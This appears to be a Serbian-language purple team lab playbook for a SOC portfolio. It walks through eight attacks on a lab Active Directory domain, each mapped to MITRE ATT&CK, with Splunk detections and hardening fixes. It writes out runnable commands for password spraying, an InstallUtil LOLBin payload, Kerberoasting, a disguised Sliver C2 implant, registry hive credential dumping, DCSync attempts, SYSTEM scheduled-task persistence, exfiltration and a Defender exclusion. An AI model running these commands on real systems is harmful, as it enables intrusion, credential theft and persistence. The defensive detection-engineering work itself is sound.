# Purple Team Home Lab — Attack Playbook

**Projekat:** Purple LAB — SOC Analyst Level 2  
**Cilj:** Dokumentovati napadačke faze za defensive detection engineering  
**Deliverable:** CV/portfolio za cybersecurity poziciju (SOC L2)

---

## NAPOMENA ZA PURPLE TEAM KONTEKST

Ovo je dokumentacija svih 8 napadačkih faza koje su testirane u izolovanom lab okruženju **isključivo za potrebe blue team treninga**. Svaka faza je mapirana na MITRE ATT&CK framework. Za svaku fazu postoji odgovarajuća detection logika u Dokumentu 3.

**Defender ostaje uključen kroz ceo lab** — realan enterprise scenario.

**Primarni deliverable je GitHub repo** (README + detekcije kao kod) — to je ono što hiring manager skenira za ~2 min. **Video serija je opcioni deep-dive:** 8 napadačkih segmenata (1 faza = 1 segment) + Seg 9 Splunk Dashboard Tour + Seg 10 Production Hardening (bonus). Preporučeni ~1h highlight cut: Seg 4, 6, 8, 9, 10.

---

## PREGLED 8 FAZA

| # | Faza | Alat | MITRE | Status |
|---|---|---|---|---|
| 1 | Reconnaissance | nmap, kerbrute, nxc, certipy | T1046, T1087, T1018 | ✅ Radi |
| 2 | Password Spraying | kerbrute | T1110.003 | ✅ Radi |
| 3 | Execution (LOLBins) | InstallUtil.exe + .NET payload | T1218.004 | ✅ Radi |
| 4 | Kerberoasting | impacket-GetUserSPNs | T1558.003 | ✅ Radi |
| 5 | Lateral Movement | Sliver C2 mTLS | T1071.001 | ✅ Radi |
| 6 | Credential Dumping | reg save SAM/SYSTEM, secretsdump | T1003.002 | ✅ Lokalno radi, ❌ DCSync blokiran |
| 7 | Persistence | schtasks (LogonTrigger) | T1053.005 | ✅ Radi |
| 8 | C2 + Exfiltration | Sliver mTLS port 443 | T1071.001, T1041 | ✅ Radi (evasion uspešan) |

---

## FAZA 1 — RECONNAISSANCE

**MITRE:** T1046 (Network Service Discovery), T1087 (Account Discovery), T1018 (Remote System Discovery)

### Cilj
Identifikovati AD infrastrukturu, korisnike, otvorene servise, i AD CS ranjivosti pre napada.

### Komande (sa Kali, terminal)

```bash
# 1.1 Network sweep
nmap -sV 192.168.182.0/24

# 1.2 SMB enumeracija DC-a (port 445 možda blokiran sa Kali → očekuj timeout)
nmap -p 445 --script smb-os-discovery 192.168.182.135

# 1.3 NetExec SMB enumeracija
nxc smb 192.168.182.135

# 1.4 NetExec LDAP enumeracija (port 389 radi)
nxc ldap 192.168.182.135 -u '' -p '' --users

# 1.5 Kerbrute — userenum (port 88 radi)
echo -e "Administrator\nSQLService\ntstark\nfcastle\npparker\nGuest\nfrankcastle\npeterparker" > /tmp/users.txt
./kerbrute userenum --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users.txt

# 1.6 BloodHound enumeracija (sa kompromitovanim nalogom)
bloodhound-python -c All -u fcastle -p Password1 -d MARVEL.LOCAL -ns 192.168.182.135

# 1.7 ASREPRoast check (svi sa preauth disabled?)
impacket-GetNPUsers MARVEL.LOCAL/ -dc-ip 192.168.182.135 -no-pass -usersfile /tmp/users.txt

# 1.8 AD CS discovery (kritično — Certipy)
certipy-ad find -u fcastle@MARVEL.LOCAL -p Password1 -dc-ip 192.168.182.135
```

### Očekivani rezultati

- 5 živih hostova (DC, 2x Win10, Kali, Splunk)
- LDAP enumeracija: lista korisnika MARVEL.LOCAL
- Kerbrute potvrđuje koji korisnici postoje
- BloodHound dump JSON fajlovi za vizualizaciju
- ASREPRoast: nijedan korisnik nije vulnerable (svi imaju preauth)
- **Certipy nalazi:**
  - CA: MARVEL-HYDRA-DC-CA
  - 33 šablona, 11 omogućenih
  - **ESC1, ESC2, ESC3, ESC15 ranjivosti na SubCA template**
  - ESC4 na više šablona

### Komande koje NE rade (i zašto)

- `impacket-secretsdump` direktno na DC → port 445 blokiran ❌
- `certipy-ad req` ESC1 exploitation → port 135 RPC blokiran ❌
- `certipy-ad relay` → web enrollment disabled ❌

### Šta naracija video-a kaže

> "Pre nego što pucam, izviđam. Šta postoji u mreži, koji korisnici, koji servisi, koje su privilegije. Certipy mi pokazuje da AD CS ima 4 ESC ranjivosti — ali firewall blokira eksploataciju. Ostavljam to za blue team narativ — 'kako se zaštititi'."

---

## FAZA 2 — PASSWORD SPRAYING

**MITRE:** T1110.003 (Password Spraying)

### Cilj
Pronaći nalog sa slabom lozinkom — jedna lozinka preko svih naloga, pa svaki nalog dobije tačno jedan neuspeli pokušaj i lockout polisa se ne okida.

### Pre-spray (recon)

**Bitno za narativ — SAVET preporuka:** Prvo izvidi lockout polisu pre nego što kreneš.

```bash
# Ako imaš bilo koji nalog, proveri politiku:
nxc smb 192.168.182.135 -u fcastle -p Password1 --pass-pol
```

### Komande

```bash
# 2.1 Pripremi listu korisnika (samo postojeći iz Faze 1)
cat > /tmp/users_clean.txt << EOF
Administrator
SQLService
fcastle
frankcastle
peterparker
pparker
Guest
EOF

# 2.2 SPRAY — lockout izbegavamo JEDNOM lozinkom po nalogu, NE delay-em.
# --delay je u milisekundama (100ms) — samo throttle, nema veze sa lockout-om.
# Lockout bi se okinuo tek da isti nalog gađamo više puta.
./kerbrute passwordspray --dc 192.168.182.135 -d MARVEL.LOCAL /tmp/users_clean.txt 'Password1' --delay 100

# Rezultat:
# [+] VALID LOGIN: fcastle@MARVEL.LOCAL:Password1
```

### Očekivani Splunk eventi

- **EC4771** — Kerberos pre-auth failed (svi neuspeli pokušaji)
- **EC4768** — TGT issued (kada Password1 uspe za fcastle)
- **EC4625** — Account failed to log on (ako kerbrute padne na NTLM)

### Šta naracija kaže

> "Spray, ne brute force. Jedna lozinka na sve naloge. To je tiho — ne zaključavam naloge. fcastle je pao na Password1 — klasična."

---

## FAZA 3 — EXECUTION (LOLBins)

**MITRE:** T1218.004 (InstallUtil), T1059 (Command and Scripting Interpreter)

### Cilj
Pokrenuti payload kroz Microsoft signed binary (InstallUtil.exe) umesto direktno powershell.exe. Manje sumnjivo, prolazi neke AV politike.

### Priprema payload-a (sa Kali)

```bash
# 3.1 Kreiraj .NET install payload sa Mono mcs
cat > /tmp/Punisher.cs << 'EOF'
using System;
using System.Configuration.Install;
using System.Diagnostics;
using System.Runtime.InteropServices;

[System.ComponentModel.RunInstaller(true)]
public class Punisher : Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        // Execution starts here when InstallUtil /U is called
        Process.Start("cmd.exe", "/c whoami > C:\\Temp\\pwned.txt && hostname >> C:\\Temp\\pwned.txt");
    }
}
EOF

# 3.2 Kompajliraj sa Mono mcs
mcs -target:library -r:/usr/lib/mono/4.5/System.Configuration.Install.dll /tmp/Punisher.cs -out:/tmp/share/GlobalProtect_Update.dll
```

### Delivery i izvršavanje (na THEPUNISHER)

```powershell
# 3.3 Preuzmi payload preko SMB share (Kali SMB server mora da radi)
copy \\192.168.182.133\share\GlobalProtect_Update.dll C:\Temp\GlobalProtect_Update.dll

# 3.4 Pokreni preko InstallUtil (LOLBin)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Temp\GlobalProtect_Update.dll
```

### Očekivani rezultat

- `C:\Temp\pwned.txt` kreiran sa `whoami` i `hostname` outputom
- Sysmon EC1 prikazuje parent-child chain: InstallUtil.exe → cmd.exe → whoami.exe
- EC4688 sa command line `InstallUtil.exe`

### Defender behavior

- Defender **NE blokira** InstallUtil — to je Microsoft signed binary
- Defender **NE blokira** GlobalProtect_Update.dll jer je u `C:\Temp` exclusion path-u
- AMSI **NE blokira** jer InstallUtil ne ide kroz PowerShell AMSI scan

### Šta naracija kaže

> "Ne koristim powershell.exe — koristim InstallUtil.exe. To je Microsoft signed Windows binary. Defender mu veruje. Moj payload izgleda kao DLL koji se instalira. Klasičan T1218 LOLBin attack."

---

## FAZA 4 — KERBEROASTING

**MITRE:** T1558.003 (Kerberoasting)

### Cilj
Izvući TGS hash service naloga sa SPN, krekovati offline da dobijemo lozinku.

### Komande (sa Kali)

```bash
# 4.1 GetUserSPNs — traži sve naloge sa SPN
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request

# Rezultat:
# $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.LOCAL/SQLService*$xxx...

# 4.2 Sačuvaj hash u fajl
impacket-GetUserSPNs MARVEL.LOCAL/fcastle:Password1 -dc-ip 192.168.182.135 -request -outputfile /tmp/kerberoast.hashes

# 4.3 Krekuj sa hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 /tmp/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force

# Rezultat: MYpassword123#
```

### Očekivani Splunk eventi

- **EC4769** — Kerberos service ticket requested
  - **Ticket Encryption Type: 0x17 (RC4-HMAC)** — ključni indikator!
  - Account: fcastle (request from)
  - Service: SQLService@MARVEL.LOCAL

### Šta naracija kaže

> "RC4 enkripcija u Kerberos response-u je crveni alarm. Moderni Windows traži AES po default-u. RC4 znači — neko zna šta radi. SQLService nalog ima slabu lozinku. 17 sekundi za hashcat krek."

---

## FAZA 5 — LATERAL MOVEMENT (Sliver C2)

**MITRE:** T1071.001 (Web Protocols), T1572 (Protocol Tunneling)

### Cilj
Uspostaviti persistent C2 kanal sa THEPUNISHER kao domain-joined platforma za napade prema DC-u.

### Setup Sliver server (sa Kali)

```bash
# 5.1 Pokreni Sliver server
sudo sliver-server
```

Unutar Sliver konzole:
```
# 5.2 Postavi mTLS listener na port 443
mtls --lport 443

# 5.3 Generiši Windows implant
generate --mtls 192.168.182.133:443 --os windows --arch amd64 --format exe --save /tmp/

# Output: /tmp/INTENSIVE_WARLOCK.exe
```

### Pripremi delivery (Kali, drugi terminal)

```bash
# 5.4 Preimenuj implant (SAVET preporuka — legitimno ime)
sudo cp /tmp/INTENSIVE_WARLOCK.exe /tmp/share/GlobalProtect_Update.exe

# 5.5 Pokreni SMB share
sudo impacket-smbserver share /tmp/share -smb2support
```

### Izvršavanje na THEPUNISHER (kroz Sliver shell ili manuelno)

```cmd
copy \\192.168.182.133\share\GlobalProtect_Update.exe C:\Temp\GlobalProtect_Update.exe
C:\Temp\GlobalProtect_Update.exe
```

### Verifikacija sesije (Sliver konzola)

```
sessions
use <session_id>
whoami
pwd
```

### Lateral test — proveri konekciju prema DC

```
# Iz Sliver shell-a:
shell
```

```powershell
Test-NetConnection -ComputerName 192.168.182.135 -Port 445
Test-NetConnection -ComputerName 192.168.182.135 -Port 135
ping 192.168.182.135
```

### Očekivani Splunk eventi

- **Sysmon EC1** — Process Create: `GlobalProtect_Update.exe`
- **Sysmon EC3** — Network Connect: 192.168.182.133:443 (ali samo ako proces dodat na watchlist — defaultno ne hvata)
- **EC4688** — `GlobalProtect_Update.exe` started

### Šta naracija kaže

> "Sliver je moderan C2 — koristi mTLS na portu 443. Ime fajla GlobalProtect_Update.exe izgleda kao Palo Alto VPN update. Sysmon ne hvata ovo po default-u — to je tačno ono što ću da popravim u blue team delu."

---

## FAZA 6 — CREDENTIAL DUMPING

**MITRE:** T1003.002 (SAM), T1003.005 (Cached Domain Credentials), T1003.006 (DCSync — pokušan, blokiran)

### Cilj
Izvući lokalne i cached domain kredencijale sa kompromitovane mašine.

### Komande (iz Sliver shell-a)

```powershell
# 6.1 Uspostavi SMB konekciju prema DC-u (za potencijalne dalje napade)
net use \\192.168.182.135\IPC$ /user:MARVEL\fcastle Password1

# 6.2 Save registry hives lokalno
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive

# 6.3 Kopiraj na Kali kroz SMB
copy C:\Temp\sam.hive \\192.168.182.133\share\sam.hive
copy C:\Temp\system.hive \\192.168.182.133\share\system.hive
copy C:\Temp\security.hive \\192.168.182.133\share\security.hive
```

### Ekstrakcija (sa Kali)

```bash
sudo impacket-secretsdump -sam /tmp/share/sam.hive -system /tmp/share/system.hive -security /tmp/share/security.hive LOCAL
```

### Šta dobijaš

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435...:fbdcd5041c96ddbd82224270b57f11fc:::
frankcastle:1001:aad3b435...:64f12cddaa88057e06a81b54e73b949b:::
SUPERMAN:1002:aad3b435...:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Dumping cached domain logon information
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f

[*] Dumping LSA Secrets
$MACHINE.ACC:aad3b435...:d770bd67e3abc0203eff3c20cf595db2
dpapi_machinekey:0x57a7e865c5b2fb91eef0506730aed4ccbb6938e0
NL$KM:1f523cfbda5fdb429fb1a2b324c1eca0...
```

### DCSync — pokušan, BLOKIRAN

```powershell
# 6.4 Mimikatz DCSync (BLOKIRAN OD STRANE AMSI)
C:\Temp\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:MARVEL.LOCAL" "exit"
# Rezultat: "This script contains malicious content and has been blocked by your antivirus software"

# 6.5 SharpKatz alternative (manje signature)
C:\Temp\SharpKatz.exe --Command dcsync --User krbtgt --Domain MARVEL.LOCAL --DomainController 192.168.182.135
# Rezultat: "Error: 1825 - Error DC bind with default Guid"
# Razlog: fcastle nema "Replicating Directory Changes" pravo
```

### Zaključak za blue team narativ

**DCSync blokiran iz dva razloga:**
1. Defender + AMSI blokira Mimikatz signature
2. Domain user (fcastle, SQLService) nema DCSync privilegije

**Ovo je odlična blue team priča** — pokazuje da:
- Endpoint protection (Defender) brani od poznatih alata
- AD nije misconfigurisan sa previše privilegija
- Bez Domain Admin naloga, DCSync neće raditi

### Očekivani Splunk eventi

- **EC4688** sa command line `reg.exe save HKLM\SAM`, `HKLM\SYSTEM`, `HKLM\SECURITY` — kritični indikator
- **EC4688** sa `net.exe use \\192.168.182.135\IPC$` — auth pokušaj prema DC-u
- **Defender Operational log** — blokade Mimikatz signature
- **Sysmon EC11** — File Create za sam.hive, system.hive, security.hive

### Šta naracija kaže

> "reg save SAM — to je trag koji svaki SOC analitičar treba da vidi. Defender ne blokira reg.exe jer je legitiman Windows alat. Ali kombinacija `save` + `SAM/SYSTEM/SECURITY` — to je crveni alarm."

---

## FAZA 7 — PERSISTENCE

**MITRE:** T1053.005 (Scheduled Task/Job)

### Cilj
Obezbediti persistence — da implant ostane živ posle reboot-a.

### Komande (iz Sliver shell-a)

```powershell
# 7.1 Pre-flight — proveri da audit policy hvata task creation
auditpol /get /subcategory:"Other Object Access Events"
# Ako "No Auditing":
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

# 7.2 Kreiraj scheduled task — LogonTrigger
schtasks /create /tn "WindowsUpdateService" /tr "C:\Temp\GlobalProtect_Update.exe" /sc onlogon /ru SYSTEM /f

# 7.3 Verifikuj
schtasks /query /tn "WindowsUpdateService"
```

### Test persistence

```powershell
# Logoff/logon ili reboot — task će pokrenuti implant
# Ako koristimo Sliver, videćeš novu sesiju u konzoli
```

### Očekivani Splunk eventi

- **EC4698** — Scheduled Task Created
  - Task Name: `\WindowsUpdateService`
  - Author: `THEPUNISHER\frankcastle`
  - Command: `C:\Temp\GlobalProtect_Update.exe`
  - Trigger: `LogonTrigger`
  - Principal: `S-1-5-18` (SYSTEM)

### Šta naracija kaže

> "Scheduled task sa logon trigger-om, running as SYSTEM. To je klasičan persistence pattern. EC4698 u Splunk-u uhvati ovo sa kompletnim XML sadržajem — Task name, command path, principal."

---

## FAZA 8 — C2 + EXFILTRATION

**MITRE:** T1071.001 (Web Protocols), T1041 (Exfiltration Over C2 Channel)

### Cilj
Demonstrirati ongoing C2 komunikaciju i exfiltration kroz Sliver mTLS kanal.

### Setup

Sliver C2 već radi od Faze 5. Beaconing ide na port 443 prema Kali-ju.

### Exfiltration test (iz Sliver konzole)

```
# 8.1 Sa kompromitovane mašine, prikupi loot
shell
```

```powershell
# Kreiraj lažni "sensitive" fajl
echo "Top secret data: customer database backup" > C:\Temp\loot.txt
exit
```

```
# 8.2 Exfiltration kroz Sliver kanal
download C:\Temp\loot.txt
```

### C2 beaconing analiza

Sliver beacon obrasci:
- Default interval: 60 sekundi
- Jitter: 30%
- Protocol: mTLS na port 443
- Destination IP: 192.168.182.133 (Kali)
- Process: `GlobalProtect_Update.exe`

### Očekivani Splunk eventi (KLJUČNO za blue team narativ)

**Default Sysmon config — NE HVATA Sliver beaconing** jer NetworkConnect nije uključen za procese iz user-writable putanja (default Sysmon ne loguje svaki odlazni konekt).

```spl
# Ovaj upit NEĆE pokazati Sliver
index=main source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 
  dst_port=443
```

**Detection iteration — behavioral, NE po imenu fajla:**

Naivni fix bi bio dodati `GlobalProtect_Update.exe` na watchlist — anti-pattern, napadač
preimenuje binar i detekcija pada. Pravi gap je precizniji: SwiftOnSecurity baseline već
loguje NetworkConnect iz `C:\Users` (pokriva AppData/Public), `C:\ProgramData` i
`C:\Windows\Temp` — ali NE iz golog `C:\Temp`, gde je naš implant. Jedna linija u postojeću
`<NetworkConnect onmatch="include">` sekciju zatvara tačno tu rupu:

```xml
<Image name="PurpleLab" condition="begin with">C:\Temp\</Image>
```

Posle restart-a Sysmon-a, ponovo pokreni implant — Splunk hvata EC3 sa Kali destination.
Fidelity diže beacon-interval analiza (Sliver default 60s ± 30%), ne ime procesa. Pun config
je u `config/sysmonconfig.xml`; vendor-agnostic verzija je Sigma rule 7 u
`detections/sigma/sigma_rules.yml`.

### Šta naracija kaže

> "Ovo je purple team pointa. Sliver radi, beaconing radi, ali default Sysmon NE LOGUJE network connect za njega. Gap nije u imenu fajla — to je zamka. Ako popravim detekciju na ime `GlobalProtect_Update.exe`, napadač preimenuje binarni fajl i ja sam slep. Zato detektujem lokaciju i ponašanje: bilo koji proces iz user-writable putanje koji ide na mrežu, plus beacon-interval analiza. To je razlika između L1 IOC-a i L2 behavioral detekcije."

---

## REDOSLED IZVRŠAVANJA ZA SNIMANJE VIDEA

### Pre-flight (5 min)

1. ✅ Upali sve VM-ove
2. ✅ Pokreni validation skriptu na svim Windows mašinama
3. ✅ Verifikuj Splunk forwarder konekciju
4. ✅ Pokreni Sliver server, mTLS listener, SMB share

### Snimanje — FINALNA STRUKTURA (10 segmenata)

**Princip:** 1 faza = 1 segment. Faza 8 je climax (purple team detection engineering momenat). Seg 10 je bonus koji odvaja L2 od L1 kandidata.

**Kontekst:** CV/portfolio za cybersecurity poziciju, NE YouTube retention. Kraće je bolje — hiring manager skenira 2-3 min po videu.

#### Puna serija (10 segmenata)

| # | Segment | Faza | Trajanje | Status |
|---|---|---|---|---|
| 1 | Lab Setup & Recon | Faza 1 | 15-20 min | Core |
| 2 | Password Spraying | Faza 2 | 10-12 min | Core |
| 3 | LOLBin Execution | Faza 3 | 10-12 min | Core |
| 4 | Kerberoasting | Faza 4 | 12-15 min | Core |
| 5 | Lateral Movement / Sliver C2 | Faza 5 | 15 min | Core |
| 6 | Credential Dumping | Faza 6 | 12-15 min | Core |
| 7 | Persistence | Faza 7 | 10-12 min | Core |
| 8 | C2 Evasion & Detection Engineering | Faza 8 | 12-15 min | Core (CLIMAX) |
| 9 | Splunk Dashboard Tour | — | 15 min | Core |
| 10 | Production Hardening: Closing the Gaps | — | 15-20 min | Bonus |

**Ukupno: ~2h 15min – 2h 45min**

#### CV minimum (5 segmenata — preporučeno za prvi pass)

| # | Segment | Trajanje | Zašto |
|---|---|---|---|
| 4 | Kerberoasting | 12-15 min | AD specifičnost, RC4 detection |
| 6 | Credential Dumping | 12-15 min | Defender/AMSI win — blue team flex |
| 8 | C2 Evasion & Detection Engineering | 12-15 min | Climax, detection engineering dubina |
| 9 | Splunk Dashboard Tour | 10-12 min | Hiring manager skoči direktno |
| 10 | Production Hardening | 15-20 min | L2 vs L1 diferencijator |

**Ukupno: ~1h – 1h 17min**

---

**Segment 1 — Lab Setup & Recon (15-20 min) — Faza 1**
- Prikaz lab arhitekture (MARVEL.LOCAL topologija)
- Sve recon komande (nmap, kerbrute, nxc, certipy, BloodHound)
- AD CS ESC ranjivosti — Certipy nalazi
- Pregled Splunk dashboard-a sa baseline-om

**Segment 2 — Password Spraying (10-12 min) — Faza 2**
- Pre-spray recon (lockout polisa check)
- kerbrute passwordspray sa --delay 100
- Splunk detekcija EC4771/4768/4625
- Live dashboard update

**Segment 3 — LOLBin Execution (10-12 min) — Faza 3**
- InstallUtil.exe T1218.004
- Zašto Defender ne blokira Microsoft signed binary
- AMSI ne ide kroz InstallUtil path
- Sysmon EC1 parent-child chain analiza

**Segment 4 — Kerberoasting (12-15 min) — Faza 4**
- impacket-GetUserSPNs preko Sliver shell-a
- hashcat offline crack
- **SQLService description anti-pattern wisdom drop** (centralna poenta)
- Splunk detekcija EC4769 (TGS request)

**Segment 5 — Lateral Movement / Sliver C2 (15 min) — Faza 5**
- Sliver server, mTLS listener, payload generate
- Deployment kroz SMB share
- Network pivot — sa THEPUNISHER na DC port 445/135
- Zašto mTLS prolazi enterprise TLS inspection

**Segment 6 — Credential Dumping (12-15 min) — Faza 6**
- SAM/SYSTEM/SECURITY hive dump (reg save)
- DCSync attempt + blokada (fcastle nema replication prava)
- **Blue team win narativ** — Defender + AMSI + AD permisije = Defense in Depth
- EC1116/1117 Defender events

**Segment 7 — Persistence (10-12 min) — Faza 7**
- schtasks LogonTrigger /ru SYSTEM
- Masquerading discipline (WindowsUpdateService)
- 4 event source-a za T1053.005 detection
- Splunk EC4698 sa XML parsing

**Segment 8 — C2 Evasion & Detection Engineering (12-15 min) — Faza 8 [CLIMAX]**
- Sliver beaconing analiza (60s + jitter)
- **Default Sysmon NE HVATA Sliver** — purple team gap
- Live demo: dodavanje C:\Temp watchlist na Sysmon NetworkConnect
- Restart Sysmon → EC3 sada radi
- **Ovo je centralna poenta cele serije** — emulate, detect, gap, iterate

**Segment 9 — Splunk Dashboard Tour (15 min)**
- Walkthrough svih 8 detekcija kroz dashboard
- MITRE ATT&CK mapping vizualizacija
- Lessons learned + threat hunting next steps

**Segment 10 — Production Hardening: Closing the Gaps (15-20 min) — BONUS**

*Cilj:* Demonstrirati "Before/After Detection Engineering" — pokazati napad → fix → re-run dokaz da fix radi. Tri skill-a u jednom segmentu: threat understanding, prevention, detection engineering. Ovo razdvaja L2 od L1 kandidata.

*Struktura — 4 demoa po formatu napad → fix → re-run:*

| Faza | Napad | Hardening Fix | Verifikacija |
|---|---|---|---|
| 2 | Password Spray fcastle:Password1 | Fine-Grained Password Policy + lockout 5/30min + strong reset | Kerbrute fail + EC4740 lockout |
| 4 | Kerberoasting SQLService RC4 | AES256 enforcement + 23-char password + description cleanup | hashcat estimate 47 godina + EC4769 enc_type=0x12 |
| 5 | Sliver implant iz C:\Temp | AppLocker Deny rule za user-writable path-ove | "Blocked by group policy" + EC8004 |
| 8 | mTLS C2 beacon na 443 | Sysmon NetworkConnect watchlist (GPO deployment) | EC3 hvata beacon iz C:\Temp |

*Closing insight (CENTRALNA POENTA):*

> "Hardening ≠ Detection. Sva četiri napada su zaustavljena ili detektovana, ali nijedan kontrol nije bulletproof. Spray može da postane low-and-slow. AppLocker se bypass-uje kroz signed LOLBin. Sysmon watchlist propušta sve van C:\Temp. Detection je safety net za sve što prođe prevention layer."

*Komande za AD account hygiene (Fix #2):*

```powershell
# Force AES-only za SQLService
Set-ADUser -Identity SQLService -KerberosEncryptionType AES256

# Strong password reset
Set-ADAccountPassword -Identity SQLService -Reset `
  -NewPassword (ConvertTo-SecureString "Tg7#nQ9pX@2vMw4kL!8jBr5" -AsPlainText -Force)

# Cleanup description
Set-ADUser -Identity SQLService -Description "SQL Service Account - DO NOT MODIFY"
```

*Komande za Fine-Grained Password Policy (Fix #1):*

```powershell
New-ADFineGrainedPasswordPolicy -Name "Strong-Users" -Precedence 10 `
  -MinPasswordLength 14 -ComplexityEnabled $true `
  -LockoutThreshold 5 -LockoutDuration "00:30:00" `
  -LockoutObservationWindow "00:30:00"
Add-ADFineGrainedPasswordPolicySubject -Identity "Strong-Users" -Subjects "Domain Users"
```

*Komande za AppLocker (Fix #3):*

```powershell
New-AppLockerPolicy -RuleType Path -User Everyone -Action Deny `
  -RulePath "C:\Temp\*","C:\Users\*\AppData\Local\Temp\*" `
  -RuleNamePrefix "PurpleLab-Block" | Set-AppLockerPolicy -Merge
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service -Name AppIDSvc
```

*Sysmon config za Fix #4 — već dokumentovan u FAZA 8.*

*Wisdom drop — L1 vs L2 vs L3 vocabulary:*

> "L1 misli alate ('imamo Splunk, pokriveni smo'). L2 misli metodologiju (Detection-as-Code, MITRE ATT&CK coverage). L3 misli strategiju (threat model, attack paths, prevention vs detection investment balance). Ovaj segment ti je dao vokabular za L2 → L3 razgovor."

*Šta sledeće — Lab v2 (closing teaser):*

- NDR layer — pfSense + Suricata/Zeek za JA3 fingerprinting
- EDR layer — Wazuh ili LimaCharlie
- Threat Intel — MISP platforma sa Splunk integracijom

### Tips za snimanje

- Koristi tab completion (deluje profesionalno)
- Imaj sve komande u clipboard-u (ne kucaj uživo komplikovane stringove)
- Govori dok izvršavaš — ne tišina dok čekaš output
- Snimi u OBS sa screen capture-om Kali + Splunk + Sliver paralelno
- 1080p, 30fps dovoljno za demo
- Edituj posle — ukloni dugе pauze

---

## TROUBLESHOOTING TOKOM NAPADA

### Sliver sesija pada

```bash
# Proveri da li je Sliver server živ
sudo ss -tlnp | grep 443

# Ako port zauzet od starog procesa:
sudo kill -9 <PID>
sudo sliver-server
```

### SMB server pada

```bash
# Proveri
sudo ss -tlnp | grep 445

# Restart
sudo kill -9 <PID>
sudo impacket-smbserver share /tmp/share -smb2support
```

### Defender briše implant

- Proveri da je `C:\Temp` u exclusion path-u (GPO)
- Ako ne, dodaj manuelno (samo za lab):
```powershell
Add-MpPreference -ExclusionPath "C:\Temp"
```

### Splunk ne hvata eventi

- Restart forwarder: `Restart-Service SplunkForwarder`
- Proveri inputs.conf
- Proveri da je audit policy uključena za relevantnu subcategory

---

**Kraj Dokumenta 2**  
**Sledeći:** `03_detection_playbook.md` — Detection Cards po MITRE formatu za svih 8 faza + Production Hardening playbook
